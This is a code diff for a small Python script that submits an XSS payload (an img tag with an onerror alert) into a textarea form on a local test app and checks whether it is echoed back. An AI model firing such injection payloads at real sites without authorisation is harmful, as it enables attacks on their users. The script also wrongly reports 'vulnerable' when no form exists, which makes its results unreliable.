@@ -1,14 +1,46 @@
-#!/usr/bin/python3
+'''
+    auto-exploit vulnerability xss
+    payload : <img src='foo' onerror='alert(1)'/> 
+'''
+import requests
+import mechanize
+from bs4 import BeautifulSoup
 
-import sys, os
-from attack import Attack
+
+URL = 'http://127.0.0.1:5000/'
+PAYLOAD = '<img src="foo" onerror="alert(\'vulnerable test\');" />'
+
+def submit_form(form):
+    textarea = form.textarea
+    if textarea:
+        form_submit = mechanize.Browser()
+        form_submit.open(URL)
+        form_submit.select_form(form.get('name'))
+        form_submit.form[textarea.get('name')] = PAYLOAD
+        form_submit.submit()
+
+        final_result = form_submit.response().read().decode()
+        print("finale result is\n", final_result)
+        is_vulnerable = bool(final_result.find(PAYLOAD) > 0)
+        return is_vulnerable
+    else:
+        # No textarea is found
+        return True
 
 
-def main(url):
-	attack = Attack(url)
-	payload = '&lt;img src="foo" onerror="alert(\'vulnerable\');" /&gt;'
+def attack():
+    request = requests.get(URL)
+    parsedHTML = BeautifulSoup(request.text, 'html.parser')
+    form = parsedHTML.form
+    if form:
+        return submit_form(form)
+    else:
+        # No form is found
+        return True
 
-	res = attack.run(payload)
+
+def main():
+	res = attack()
 	if res:
 		msg = "The app is vulnerable"
 	else:
@@ -16,6 +48,5 @@ def main(url):
 	return (res, msg)
 
 if __name__ == '__main__':
-	url = 'http://0.0.0.0:5000/'
-	res = main(url)
+	res = main()
 	print(res)
